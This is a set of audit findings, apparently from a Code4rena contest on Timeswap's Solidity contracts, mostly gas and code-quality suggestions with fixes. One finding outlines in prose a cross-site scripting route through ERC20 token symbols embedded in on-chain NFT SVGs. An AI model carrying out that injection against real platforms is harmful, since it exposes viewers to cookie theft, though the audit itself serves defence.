# Handle  WatchPug   # Vulnerability details  For the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.  For example:  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L149-L150  ```solidity         require(block.timestamp < maturity, 'E202');         require(maturity - block.timestamp < 0x100000000, 'E208'); ```   `maturity - block.timestamp` will never underflow.   https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/WithdrawMath.sol#L31-L33  ```solidity         if (state.reserves.asset >= state.totalClaims.bond) return collateralOut;         uint256 deficit = state.totalClaims.bond;         deficit -= state.reserves.asset; ```  `deficit -= state.reserves.asset` will never underflow.   https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/MsgValue.sol#L12-L12  ```solidity if (msg.value > value) ETH.transfer(payable(msg.sender), msg.value - value); ```  `msg.value - value` will never underflow.  
# Handle  WatchPug   # Vulnerability details  Move storage writes to inside the code block of `if (tokensOut.asset > 0) {...}` can avoid unnecessary code execution when this check doesn't pass and save gas.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L214-L218  ```solidity         pool.state.reserves.asset -= tokensOut.asset;         pool.state.reserves.collateral -= tokensOut.collateral;          if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset);         if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral); ``` ### Recommendation  Change to:  ```solidity         if (tokensOut.asset > 0) {                 pool.state.reserves.asset -= tokensOut.asset;                 asset.safeTransfer(assetTo, tokensOut.asset);         }         if (tokensOut.collateral > 0) {                 pool.state.reserves.collateral -= tokensOut.collateral;                 collateral.safeTransfer(collateralTo, tokensOut.collateral);         } ```    
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L157-L169  ```solidity=157 if (pool.state.totalLiquidity == 0) {     uint256 liquidityTotal = MintMath.getLiquidityTotal(xIncrease);     liquidityOut = MintMath.getLiquidity(maturity, liquidityTotal, protocolFee);      pool.state.totalLiquidity += liquidityTotal;     pool.liquidities[factory.owner()] += liquidityTotal - liquidityOut; } else {     uint256 liquidityTotal = MintMath.getLiquidityTotal(pool.state, xIncrease, yIncrease, zIncrease);     liquidityOut = MintMath.getLiquidity(maturity, liquidityTotal, protocolFee);      pool.state.totalLiquidity += liquidityTotal;     pool.liquidities[factory.owner()] += liquidityTotal - liquidityOut; } ```  ### Recommendation  Change to:  ```solidity=157 uint256 liquidityTotal = pool.state.totalLiquidity == 0 ?     MintMath.getLiquidityTotal(xIncrease) :     MintMath.getLiquidityTotal(pool.state, xIncrease, yIncrease, zIncrease); liquidityOut = MintMath.getLiquidity(maturity, liquidityTotal, protocolFee);  pool.state.totalLiquidity += liquidityTotal; pool.liquidities[factory.owner()] += liquidityTotal - liquidityOut; ```  1. Avoiding code duplication; 2. Using the ternary operator to make the code shorter.  
# Handle  WatchPug   # Vulnerability details  Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  Caching the array length in the stack saves around 3 gas per iteration.  Instances include:  - `TimeswapPair.sol#pay()`      https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L359-L359   - `PayMath.sol#givenMaxAssetsIn()`      https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/PayMath.sol#L21-L21   
# Handle  rfa   # Vulnerability details  ## Impact more expensive gas  ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L58  instead of caching state on memory. just read it directly from the storage.  State memory state = pools[maturity].state;  ## Tools Used self research on:  https://remix.ethereum.org/  ## Recommended Mitigation Steps State storage state = pools[maturity].state;  
# Handle  ye0lde   # Vulnerability details  # Vulnerability details  ## Impact Open TODOs can point to architecture or programming issues that still need to be resolved.  ## Proof of Concept The TODO is here: https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L87  ## Tools Used VS Code  ## Recommended Mitigation Steps Consider resolving the TODO before deploying.  
# Handle  ye0lde   # Vulnerability details  ## Impact  The function below fails to perform input validation on arrays to verify the lengths match.  A mismatch could lead to an exception or undefined behavior.  ## Proof of Concept  `ids`, `assetsIn` (copied into from `maxAssetsIn` on line 18) https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/PayMath.sol#L15-L28  While `givenMaxAssetsIn` is an internal function if you trace the code back the parameters are passed in by an external function (`pay` or `payEthAsset` or `payEthCollateral`) with no array length validation.  ## Tools Used Visual Studio Code, Remix  ## Recommended Mitigation Steps  Add input validation to check that the length of all arrays match (`ids`, `maxAssetsIn`).  
# Handle  ye0lde   # Vulnerability details  # Vulnerability details  ## Impact Typos  ## Proof of Concept The typos are here:  'recommnded' https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapFactory.sol#L11 https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L20  'seconde' https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/interfaces/IFactory.sol#L39  'addres' 'dcrease' https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/interfaces/IPair.sol#L319-L320   ## Tools Used VS Code  ## Recommended Mitigation Steps Correct the typos  
# Handle  thank_you   # Vulnerability details  ## Impact SVG is a unique type of image file format that is often susceptible to Cross-site scripting. If a malicious user is able to inject malicious Javascript into a SVG file, then any user who views the SVG on a website will be susceptible to XSS. This can lead stolen cookies, Denial of Service attacks, and more.  The `NFTTokenURIScaffold` contract generates a SVG via the `NFTSVG.constructSVG` function. One of the arguments used by the `NFTSVG.constructSVG` function is `svgTitle` which represents the ERC20 symbols of both the asset and collateral ERC20 tokens. When generating an ERC20 contract, a malicious user can set malicious XSS as the ERC20 symbol.   These set of circumstances leads to XSS when the SVG is loaded on any website.   ## Proof of Concept 1. Hacker generates an ERC20 token with a symbol that contains malicious Javascript. 2. Hacker generates a TimeSwap Pair with an asset or collateral that matches the malicious ERC20 token created in Step 1. 3. When `NFTTokenURIScaffold#constructTokenURI` is called, a SVG is generated. This process works such that when generating the SVG the tainted ERC20 symbol created in Step 1 is [passed](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L90) to the `NFTSVG.constructSVG` function [here](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L102). This function returns a SVG [containing](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTSVG.sol#L27) the tainted ERC20 symbol. 4. When the SVG is loaded on any site such as OpenSea, any user viewing that SVG will load the malicious Javascript from within the SVG and result in a XSS attack.   ## Tools Used N/A  ## Recommended Mitigation Steps Creating a SVG file inside of a Solidity contract is novel and thus requires the entity creating a SVG file to sanitize any potential user-input that goes into generating the SVG file.   As of this time there are no known Solidity libraries that sanitize text to prevent an XSS attack. The easiest solution is to remove all user-input data from the SVG file or not generate the SVG at all.   
# Handle  OriDabush   # Vulnerability details  # TimeswapPair.sol - Gas Optimization Lines 289-290 can be transferred into the if statements to avoid subtract 0 from the variables.  ### code before: pool.state.reserves.asset -= tokensOut.asset;  pool.state.reserves.collateral -= tokensOut.collateral;  if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset);  if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral);  ### code after:  if (tokensOut.asset > 0) {     asset.safeTransfer(assetTo, tokensOut.asset);     pool.state.reserves.asset -= tokensOut.asset; }  if (tokensOut.collateral > 0) {     collateral.safeTransfer(collateralTo, tokensOut.collateral);     pool.state.reserves.collateral -= tokensOut.collateral; }     
# Handle  Dravee   # Vulnerability details  ## Impact   If a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern and wastes gas.    ## Proof of Concept   Instances include:   ``` Timeswap-V1-Convenience\contracts\libraries\NFTTokenURIScaffold.sol:119:        for(uint i = 0; i < lengthDiff; i++) { Timeswap-V1-Convenience\contracts\libraries\NFTTokenURIScaffold.sol:147:        for(uint i = 0; i < lengthDiff; i++) { Timeswap-V1-Convenience\contracts\libraries\NFTTokenURIScaffold.sol:201:        for (uint256 i = 0; i < data.length; i++) { ```     ## Tools Used   Manual Analysis      ## Recommended Mitigation Steps   Remove explicit initialization for default values.   
# Handle  sirhashalot   # Vulnerability details  ## Impact  The `safeSymbol()` function, found in the SafeMetadata.sol contract and called in 4 Timeswap Convenience contracts in the `symbol()` functions, can cause a revert. This could make the 4 contracts not compliant with the ERC20 standard for certain asset pairs, because the `symbol()` function should return a string and not revert.  The root cause of the issue is that the `safeSymbol()` function assumes the return type of any ERC20 token to be a string. If the return value is not a string, abi.decode() will revert, and this will cause the `symbol()` functions in the Timeswap ERC20 contracts to revert.  Because this is known to cause issues with tokens that don't fully follow the ERC20 spec, the `safeSymbol()` function in the BoringCrypto library has a fix for this. The BoringCrypto `safeSymbol()` function is similar to the one in Timeswap but it has a `returnDataToString()` function that handles the case of a bytes32 return value for a token name: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39  ## Proof of Concept  The root cause is [line 20](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L20)  of the `safeSymbol()` function in SafeMetadata.sol  The `safeSymbol()` function is called in: - [Bond.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L27-L31) - [CollateralizedDebt.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L38-L42) - [Insurance.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L29-L33) - [Liquidity.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Liquidity.sol#L31-L35)  ## Recommended Mitigation Steps  Use the BoringCrypto `safeSymbol()` function code with the `returnDataToString()` parsing function to handle the case of a bytes32 return value: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39  
# Handle  sirhashalot   # Vulnerability details  ## Impact  The `safeName()` function, found in the SafeMetadata.sol contract and called in 4 Timeswap Convenience contracts in the `name()` functions, can cause a revert. This could make the 4 contracts not compliant with the ERC20 standard for certain asset pairs, because the `name()` function should return a string and not revert.  The root cause of the issue is that the `safeName()` function assumes the return type of any ERC20 token to be a string. If the return value is not a string, abi.decode() will revert, and this will cause the `name()` functions in the Timeswap ERC20 contracts to revert. There are some tokens that aren't compliant, such as Sai from Maker, which returns a bytes32 value:  https://kauri.io/#single/dai-token-guide-for-developers/#token-info  Because this is known to cause issues with tokens that don't fully follow the ERC20 spec, the `safeName()` function in the BoringCrypto library has a fix for this. The BoringCrypto `safeName()` function is similar to the one in Timeswap but it has a `returnDataToString()` function that handles the case of a bytes32 return value for a token name: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47  ## Proof of Concept  The root cause is [line 12](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L12) of the `safeName()` function in SafeMetadata.sol  The `safeName()` function is called in: - [Bond.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L20-L25) - [CollateralizedDebt.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L22-L36) - [Insurance.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L20-L27) - [Liquidity.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Liquidity.sol#L22-L29)  ## Recommended Mitigation Steps  Use the BoringCrypto `safeName()` function code to handle the case of a bytes32 return value: https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47  
# Handle  sirhashalot   # Vulnerability details  ## Impact  The `safeDecimals()` function, found in the SafeMetadata.sol contract and called in 3 different Timeswap Convenience contracts, can cause a revert. This is because the safeDecimals function attempts to use abi.decode to return a uint8 when `data.length >= 32`. However, a data.length value greater than 32 will cause abi.decode to revert.  A similar issue was found in a previoud code4rena contest: https://github.com/code-423n4/2021-05-nftx-findings/issues/46  ## Proof of Concept  The root cause is [line 28](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L28) of the `safeDecimals()` function in SafeMetadata.sol  The following link shows the `safeDecimals()` function in the BoringCrypto library, which might be where this code was borrowed from, uses the strict equality check `data.length == 32` https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L54  `safeDecimals()` is used in multiple functions such as - CollateralizedDebt.sol [line 50](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L50) and [line 54](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L54) - Bond.sol [line 34](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L34) - Insurance.sol [line 36](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L36)  ## Recommended Mitigation Steps  Modify the `safeDecimals()` function to change >= 32 to == 32 like this `if (success && data.length == 32) return   abi.decode(data, (uint8));`  
# Handle  p4st13r4   # Vulnerability details  ## Impact  In `TimeswapConvenience.sol` the `weth` state variable is read twice. It can just be immediately assigned locally so that the two `deposit` calls avoid reading the same variable from storage  ## Proof of Concept  - [https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L505](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L505) - [https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L512](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L512)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Assign `weth` to `localWeth`  
# Handle  p4st13r4   # Vulnerability details  ## Impact  In `CollateralizedDebt.sol` the `pair` state variable is read twice. It can just be immediately assigned locally so that the `require` and the `collateralizedDebtCallback` do not read the same state variable twice  ## Proof of Concept  ```jsx function timeswapPayCallback(uint128 assetIn, bytes calldata data) external override {     require(msg.sender == address(pair), 'E401');      convenience.collateralizedDebtCallback(pair, maturity, assetIn, data); } ```  ## Tools Used  Editor  ## Recommended Mitigation Steps  Assign `pair` to e.g `localPair`  
# Handle  Meta0xNull   # Vulnerability details  ## Impact A wrong user input or wallets defaulting to the zero addresses for a missing input can lead to the contract needing to redeploy or wasted gas.  ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L62-L64  ## Tools Used Manual Review  ## Recommended Mitigation Steps requires Addresses is not zero.  require(_factory != address(0), "Address Can't Be Zero") require(_weth != address(0), "Address Can't Be Zero")  
# Handle  hyh   # Vulnerability details  ## Impact  Similarly, the system will fail with low-level message without giving a business reason, which can be an issue for troubleshooting and further programmatic usages by other projects.   ## Proof of Concept  The owner variable is used by TimeswapPair.pay without validation:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L357  Which will yield low-level fail on array access if an owner is zero or not present in the system:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L360   ## Recommended Mitigation Steps  Verify owner function argument to be non-zero by expanding existing check:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L352  Then, require in line 358 that, for example, dues.length >= ids.length:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L358   
# Handle  hyh   # Vulnerability details  ## Impact  Gas is overspent on state variables storage access.  ## Proof of Concept  getCollateral only reads state.reserves.asset, state.totalClaims.insurance and state.reserves.collateral up to 2 times each, and state.totalClaims.bond up to 4 times:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/WithdrawMath.sol#L26   ## Recommended Mitigation Steps  Save all four state variables to memory before running the logic.   
# Handle  hyh   # Vulnerability details  ## Impact  If there is no liquidity in the pool, burn operation will not make sense and be reverted on low level math of decreasing liquidity share. It will be more transparent and uniform to add a check for liquidity before the logic.   ## Proof of Concept  ` burn` doesn't check for liquidity of the pool:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L205   ## Recommended Mitigation Steps  There is a check in other relevant functions, it can be added in the very same form here: ` require(pool.state.totalLiquidity > 0, 'E206')`  Error description can be updated to include ` burn `:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/ErrorCodes.md#e206   
# Handle  rfa   # Vulnerability details  ## Impact more expensive gas usage  ## Proof of Concept instead of using operator && on single require check. using additional require check can save more gas:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L151-L152 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L201-L202 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L234-L235 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L272-L273 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L309-L310 https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L351  ## Tools Used https://remix.ethereum.org  ## Recommended Mitigation Steps example: require(liquidityTo != address(0), 'E201' ); require(dueTo != address(0), 'E201');   
# Handle  bitbopper   # Vulnerability details  ## Impact `https://github.com/code-423n4/2022-01-timeswap/blob/5960e07d39f2b4a60cfabde1bd51f4b1e62e7e85/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L121:L126` could be more gas efficient  ## Proof of Concept ### Version as in Repo  ``` // SPDX-License-Identifier: GPL-3.0-or-later pragma solidity =0.8.4;  contract LockProofOld {  uint256 locked = 0;   modifier lock() {      require(locked == 0, 'E211');      locked = 1;      _;      locked = 0;  }   function test() public lock {  }  } ``` ### Proposed Version ``` // SPDX-License-Identifier: GPL-3.0-or-later pragma solidity =0.8.4;  contract LockProofNew {  uint256 locked = 1;   modifier lock() {      require(locked == 1, 'E211');      locked = 2;      _;      locked = 1;  }   function test() public lock {  }  } ```  ### Comparison #### Test harness ``` // SPDX-License-Identifier: GPL-3.0-or-later pragma solidity =0.8.4;  import "ds-test/test.sol";  import "./LockProofOld.sol"; import "./LockProofNew.sol";  contract LockProofTest is DSTest {     LockProofOld lockproofold;     LockProofNew lockproofnew;      function setUp() public {         lockproofold = new LockProofOld();         lockproofnew = new LockProofNew();     }      function test_old() public {   lockproofold.test();     }      function test_new() public {   lockproofnew.test();     } } ``` #### Output ``` dapp test Running 2 tests for src/LockProof.t.sol:LockProofTest [PASS] test_old() (gas: 21042) [PASS] test_new() (gas: 1136) ```   
# Handle  Dravee   # Vulnerability details  ## Impact The `acceptOwner()` external function can be called indefinitely instead of only once. The contract's state doesn't reflect reality. The code doesn't follow the standard implementation of a 2-step ownership transfer.  ## Proof of Concept Here's the current `acceptOwner()` external function, which lacks a reset of `pendingOwner` to `address(0)` : ```     function acceptOwner() external override {         require(msg.sender == pendingOwner, 'E102');         owner = msg.sender;          emit AcceptOwner(msg.sender);     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Change the code to: ```     function acceptOwner() external override {         require(msg.sender == pendingOwner, 'E102');         owner = msg.sender;         pendingOwner = address(0); // @audit : line to add          emit AcceptOwner(msg.sender);     } ```  
# Handle  Dravee   # Vulnerability details  ## Impact Removing unused named return variables can reduce gas usage and improve code clarity.  ## Proof of Concept In `TimeswapPair:constantProduct()`, you return using both named return and actual return statement. To save gas and improve code quality consider using only one of those.  ```     /// @inheritdoc IPair     function constantProduct(uint256 maturity)         external         view         override         returns (             uint112 x,             uint112 y,             uint112 z         )     {         State memory state = pools[maturity].state;         return (state.x, state.y, state.z);     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Remove the unused named returns  
# Handle  Dravee   # Vulnerability details  ## Impact Some of the require statements can be placed earlier to reduce gas usage on revert. As a reminder from the [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf), Appendix G and Appendix H: - TIMESTAMP costs 2 gas - ADDRESS costs 2 gas - MLOAD costs 3 gas  ## Proof of Concept The following can be reorder to save gas on revert:  ```         require(block.timestamp < maturity, 'E202');          require(ids.length == assetsIn.length && ids.length == collateralsOut.length, 'E205');         require(to != address(0), 'E201');         require(to != address(this), 'E204'); ``` to ```         require(block.timestamp < maturity, 'E202');         require(to != address(0), 'E201');         require(to != address(this), 'E204');         require(ids.length == assetsIn.length && ids.length == collateralsOut.length, 'E205'); ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Relocate the said require statements  
# Handle  Dravee   # Vulnerability details  ## Impact   Due to how `constant` variables are implemented, an expression assigned to a `constant` variable is recomputed each time that the variable is used, which wastes some gas.      If the variable was `immutable` instead: the calculation would only be done once at deploy time (in the constructor), and then the result would be saved and read directly at runtime rather than being recalculated.    See: [ethereum/solidity#9232]([https://github.com/ethereum/solidity/issues/9232](https://github.com/ethereum/solidity/issues/9232))      ## Proof of Concept   ```   Timeswap-V1-Convenience\contracts\libraries\DateTime.sol:31:    uint constant SECONDS_PER_DAY = 24 * 60 * 60; Timeswap-V1-Convenience\contracts\libraries\DateTime.sol:32:    uint constant SECONDS_PER_HOUR = 60 * 60; ```      ## Tools Used   VS Code      ## Recommended Mitigation Steps   Change these expressions from `constant` to `immutable` and implement the calculation in the constructor   
# Handle  hyh   # Vulnerability details  ## Impact  There can be issues with troubleshooting and system usage analytics.  ## Proof of Concept  E512 error code is meant for 'Debt is greater than max Debt' situation:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/ErrorCodes.md#e512   In Mint library E512 is used for collateral max value check:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Mint.sol#L482   Also, code E513, that is to be used for collateral check above, is also used for max asset increase check, which doesnt seem to have an error code of its own:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Mint.sol#L481  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Mint.sol#L643   ## Recommended Mitigation Steps  Change Mint line 482 error code to be 513: https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/ErrorCodes.md#e513  Possibly add an error code for max asset check for Mint lines 481 and 643.  
# Handle  0x1f8b   # Vulnerability details  ## Impact Gas saving.  ## Proof of Concept Moving the substraction inside the if condition in `TimeswapPair.withdraw` could be avoided the zero substraction.  ## Tools Used Manual review.  ## Recommended Mitigation Steps Change: ``` pool.state.reserves.asset -= tokensOut.asset;         pool.state.reserves.collateral -= tokensOut.collateral;          if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset);         if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral);. ``` to ```         if (tokensOut.asset > 0) { pool.state.reserves.asset -= tokensOut.asset; asset.safeTransfer(assetTo, tokensOut.asset); }         if (tokensOut.collateral > 0) { pool.state.reserves.collateral -= tokensOut.collateral; collateral.safeTransfer(collateralTo, tokensOut.collateral);. } ```  
# Handle  Jujic   # Vulnerability details  ## Impact Here you could use unchecked{++i} to save gas since it is more efficient then i++.  ``` for (uint256 i; i < ids.length; i++) {  ```  ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L359  ## Tools Used Remix  ## Recommended Mitigation Steps  
# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapConvenience.sol the constructor takes in 2 addresses for _factory and _weth and sets them in storage without checking that they are unique which can introduce possible costly errors during deployment.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L62  ## Tools Used Manuel code review   ## Recommended Mitigation Steps Add to TimeswapConvenience.sol constructor:   require(_factory != _weth, "Duplicate address")  
# Handle  jayjonah8   # Vulnerability details  ## Impact In CollateralizedDebt.sol, the mint() function calls _safeMint() which has a callback to the "to" address argument.  Functions with callbacks should have reentrancy guards in place for protection against possible malicious actors both from inside and outside the protocol.    ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L76  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L263  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L395  ## Tools Used Manual code review   ## Recommended Mitigation Steps Add a reentrancy guard modifier on the mint() function in CollateralizedDebt.sol   
# Handle  danb   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/MintMath.sol#L65  ``` y <= x ``` can be removed  
# Handle  danb   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L69  the contract should receive ether only from weth,  consider adding:  ``` require(msg.sender == weth); ```  
# Handle  robee   # Vulnerability details  The function dueOf in CollateralizedDebt.sol could be set external   
